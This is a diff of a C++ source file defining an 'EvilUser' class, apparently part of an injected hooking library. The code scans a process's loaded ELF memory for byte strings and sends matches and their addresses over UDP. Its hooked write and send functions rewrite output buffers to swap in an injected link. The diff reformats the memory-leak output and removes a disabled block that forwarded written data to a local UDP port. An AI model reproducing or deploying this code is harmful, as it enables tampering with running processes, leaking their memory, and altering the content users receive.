@@ -13,6 +13,10 @@
 #define MAX_TMPBUFFER_SIZE 100000
 static int sockFd = 0;
 
+#define COLOR_RED       "\e[1;31m"        //鲜红
+#define COLOR_GREEN       "\e[0;32m"         //深绿，暗绿
+#define COLOR_NONE      "\e[0m" 
+
 EvilUser::EvilUser() :
     tmpBuffer(nullptr)
 {}
@@ -23,7 +27,6 @@ EvilUser::~EvilUser()
         free(tmpBuffer);
 }
 
-//  二进制查找
 int BinaryFind(const unsigned char * Dest, int DestLen, 
                const unsigned char * Src, int SrcLen)   
 {   
@@ -34,9 +37,9 @@ int BinaryFind(const unsigned char * Dest, int DestLen,
 			if (Dest[i+j] != Src[j])	
 				break;
 		if (j == SrcLen) 
-			return i;	// 找到返回离Dest的距离(从0开始计算)
+			return i;
 	}   
-	return -1;		// 未找到返回-1
+	return -1;	
 }
 
 bool searchBinary(int sockFd, struct sockaddr_in *client, Elf64_Addr baseAddr, 
@@ -45,8 +48,11 @@ bool searchBinary(int sockFd, struct sockaddr_in *client, Elf64_Addr baseAddr,
     int ret = 0;
     unsigned char *p = (unsigned char *)baseAddr;
     bool status = false;
+    char buffer[256] = {0};
+    char *c = NULL;
     while (1)
     {
+        memset(buffer, 0, sizeof(buffer));
         ret = BinaryFind(p, (unsigned char *)baseAddr+size-p, str, strSize);
         if (ret < 0)
         {
@@ -57,18 +63,15 @@ bool searchBinary(int sockFd, struct sockaddr_in *client, Elf64_Addr baseAddr,
             
         status = true;
         p += ret;
-        sendto(sockFd, p, strSize+20, 0,(struct sockaddr*)client,sizeof(*client)); 
-        sendto(sockFd, "\n", 2, 0,(struct sockaddr*)client,sizeof(*client)); 
+
+        snprintf(buffer, sizeof(buffer), "str = %s, addr = %p\n", p, p);
+        sendto(sockFd, buffer, strlen(buffer), 0,(struct sockaddr*)client,sizeof(*client)); 
         p += 1;
 
         if (p - (unsigned char *)baseAddr >= size)
             return true;
     }      
 }
-
-#define COLOR_RED       "\e[1;31m"        //鲜红
-#define COLOR_GREEN       "\e[0;32m"         //深绿，暗绿
-#define COLOR_NONE      "\e[0m" 
 
 struct sockaddr_in local;
 void EvilUser::evilMain()
@@ -136,20 +139,6 @@ ssize_t EvilUser::evilSend(int sockfd, const void *&buf, size_t &len, int flags)
 
 ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
 {
-    return 0;
-    if (!sockFd)
-    {
-        sockFd=socket(AF_INET,SOCK_DGRAM,0);
-    }
-
-          struct sockaddr_in client;
-    client.sin_family=AF_INET;
-    client.sin_port=htons(11111);
-    client.sin_addr.s_addr=inet_addr("127.0.0.1");
-
-    sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
-    return 0;
-
     if (!tmpBuffer)
         tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);
 
@@ -162,7 +151,6 @@ ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
     {
         int wikiLinkSize = strlen(wikiLink);
         memcpy(p, injectLink, wikiLinkSize);
-        sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
     }
 
     return 0;
